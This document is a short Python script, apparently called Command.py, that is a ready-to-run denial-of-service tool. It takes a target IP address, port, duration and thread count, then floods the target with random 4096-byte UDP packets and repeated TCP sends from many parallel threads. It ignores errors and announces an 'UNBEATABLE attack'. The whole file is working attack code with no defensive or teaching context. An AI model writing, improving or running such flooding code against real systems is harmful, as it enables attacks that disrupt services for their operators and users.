import sys
import threading
import time
import socket
import random

def ddos_attack(target_ip, target_port, duration, threads=100):
    timeout = time.time() + duration
    def attack():
        while time.time() < timeout:
            try:
                # UDP attack
                s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_ = random._urandom(4096)  # Larger packet size
                s_udp.sendto(bytes_, (target_ip, target_port))
                s_udp.close()
                # TCP attack
                s_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s_tcp.settimeout(0.5)
                s_tcp.connect((target_ip, target_port))
                for _ in range(10):
                    s_tcp.sendall(bytes_)
                s_tcp.close()
            except Exception:
                pass
    thread_list = []
    for _ in range(threads * 2):  # Double the threads for more power
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

def main():
    if len(sys.argv) < 4:
        print("Usage: python Command.py <target_ip> <target_port> <duration_seconds> [threads]")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 100
    print(f"[DDOS] UNBEATABLE attack on {target_ip}:{target_port} for {duration}s with {threads*2} threads (UDP+TCP, high volume)...")
    ddos_attack(target_ip, target_port, duration, threads)
    print("[DDOS] Attack finished.")

if __name__ == "__main__":
    main()
